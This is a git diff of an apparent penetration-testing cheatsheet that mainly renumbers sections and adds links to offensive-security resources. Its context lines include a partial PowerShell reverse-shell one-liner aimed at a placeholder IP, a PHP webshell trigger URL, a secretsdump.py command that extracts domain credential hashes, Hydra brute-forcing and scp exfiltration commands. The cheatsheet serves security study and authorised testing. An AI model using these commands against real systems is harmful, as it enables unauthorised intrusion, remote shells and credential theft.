@@ -2,14 +2,13 @@
 
 ## Table of Contents
 
-**1. [Other Cheatsheets/Libraries](#1-other-cheatsheetslibraries)**
-
-**2. [General Tools](#2-general-tools)**
+**1. [Other Cheatsheets/Libraries](#1-general)**
 
 * [Tools](#tools)
+* [Cheatsheets](#cheatcheets)
 * [Wordlists](#wordlists)
 
-**3. [Information Gathering](#3-information-gathering)**
+**2. [Information Gathering](#2-information-gathering)**
 
 * [useful links](#useful-links)
 * [Passive](#passive)
@@ -19,11 +18,11 @@
     * [Nmap](#nmap)
 * [Other Tipps](#other-tipps)
 
-**4. [Vulnerability Scanner](#4-vulnerability-scanner)**
+**3. [Vulnerability Scanner](#3-vulnerability-scanner)**
 
 * [Databases](#databases)
 
-**5. [Exploitation](#5-exploitation)**
+**4. [Exploitation](#4-exploitation)**
 
 * [Reverse Shell useful links](#reverse-shells-useful-links--others)
 * [sqlmap](#sqlmap)
@@ -34,58 +33,68 @@
 * [Powershell one-liner](#powershell-one-liner)
 * [PHP Webshell one-liner](#php-webshell-one-liner)
 
-**6. [Linux Privilege Escalation](#6-linux-privilege-escalation)**
+**5. [Linux Privilege Escalation](#5-linux-privilege-escalation)**
 
-**7. [Windows Privilege Escalation](#7-windows-privilege-escalation)**
+**6. [Windows Privilege Escalation](#6-windows-privilege-escalation)**
 
-**8. [Password/Hash Cracking](#8-passwordhash-cracking)**
+**7. [Password/Hash Cracking](#7-passwordhash-cracking)**
 
 * [useful links](#useful-links-1)
 * [Hashcat](#hashcat)
 * [John the Ripper](#john-the-ripper)
 * [Hydra](#hydra)
 
-**9. [Exfiltration](#9-exfiltration)**
+**8. [Exfiltration](#8-exfiltration)**
 
 * [Server](#server)
 
-**10. [Persistence](#10-persistence)**
+**9. [Persistence](#9-persistence)**
 
 * [Windows](#windows)
 * [Linux](#linux)
 
-**11. [Pillaging](#11-pillaging)**
+**10. [Pillaging](#10-pillaging)**
 
-**12. [Pivoting](#12-pivoting)**
+**12. [Pivoting](#11-pivoting)**
 
 * [General](#general)
 * [SSH](#ssh)
 * [Proxychains](#proxychains)
 * [Chisel](#chisel)
 
-## 1. Other Cheatsheets/Libraries:
-[Lolbas-Project](https://lolbas-project.github.io/)
+## 1. General:
 
-[Ivan-Sincek Penetration testing cheat sheet (very detailed)](https://github.com/ivan-sincek/penetration-testing-cheat-sheet)
+### Tools:
+
+[CyberChef](https://gchq.github.io/CyberChef/)
+
+[Lolbas-Project](https://lolbas-project.github.io/)
 
 [GTFOBins](https://gtfobins.github.io/)
 
 [MITRE ATT&CK](https://attack.mitre.org/)
 
+### Cheatcheets:
+
+[HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-methodology)
+
 [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings/
 )
 
-## 2. General Tools:
+[Ivan-Sincek Penetration testing cheat sheet (very detailed)](https://github.com/ivan-sincek/penetration-testing-cheat-sheet)
 
-### Tools
+[Liodeus - OSCP Cheatsheet](https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html#linux-4)
+- port by port procedure
 
-[CyberChef](https://gchq.github.io/CyberChef/)
+[OSCP Cheatcheet](https://github.com/0xsyr0/OSCP?tab=readme-ov-file)
+
+[Red Team Notes - Pentesting Cheatsheet](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
 
 ### Wordlists:
 
 https://github.com/danielmiessler/SecLists
 
-## 3. Information Gathering:
+## 2. Information Gathering:
 
 ### useful links:
 
@@ -306,7 +315,7 @@ nmap <scan_type> <options> <machine_ip/network>
 * change `etc/hosts` if domain is not available/gets redirected
 * Banner Grabbing with nc `nc -vn <ip> <port>`
 
-## 4. Vulnerability Scanner:
+## 3. Vulnerability Scanner:
 
 [Nessus Essential Download](https://community.tenable.com/s/article/Nessus-Essentials?language=en_US)
 
@@ -320,7 +329,7 @@ nmap <scan_type> <options> <machine_ip/network>
 
 [Rapid7](https://www.rapid7.com/db/)
 
-## 5. Exploitation:
+## 4. Exploitation:
 
 ### Reverse Shells useful links & Others:
 https://github.com/martinsohn/PowerShell-reverse-shell
@@ -510,7 +519,7 @@ powershell -c “$client = New-Object System.Net.Sockets.TCPClient(‘<ip>’,<p
 
 need to trigger rev-shell -> find upload folder -> add to url-path `http://<ip>/<path>/php_shell.php?cmd=<rev_shell>`
 
-## 6. Linux Privilege Escalation:
+## 5. Linux Privilege Escalation:
 
 ### useful links:
 
@@ -660,7 +669,7 @@ A:  mkdir /tmp/<directory>
 T:  execute
 ```
 
-## 7. Windows Privilege Escalation:
+## 6. Windows Privilege Escalation:
 
 ### useful Links:
 
@@ -762,7 +771,7 @@ After fake RogueWinRM service is running:
 
 `wmic product get name,version,vendor`
 
-## 8. Password/Hash Cracking:
+## 7. Password/Hash Cracking:
 
 ### useful links:
 
@@ -840,7 +849,7 @@ hydra -l <username> -P <wordlist.txt> <server> <service>
         -t <number>         specify number of parallel connections (e.g. -t 16)
 ````
 
-## 9. Exfiltration:
+## 8. Exfiltration:
 
 ### Server:
 
@@ -852,7 +861,7 @@ copy file from remote server to local host: scp <ip>:<remote_file_path> <local_s
 
 copy directory: scp -r <directory> <username>@<ip>:<path_to_remote_directory>
 ```
-## 10. Persistence:
+## 9. Persistence:
 
 ### Windows:
 
@@ -862,7 +871,7 @@ copy directory: scp -r <directory> <username>@<ip>:<path_to_remote_directory>
 
     https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md
 
-## 11. Pillaging:
+## 10. Pillaging:
 
 [evil-winrm](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)
 
@@ -876,7 +885,7 @@ copy directory: scp -r <directory> <username>@<ip>:<path_to_remote_directory>
 
 `secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit -outputfile <>`
 
-## 12. Pivoting:
+## 11. Pivoting:
 
 ### General:
 1. https://github.com/t3l3machus/pentest-pivoting
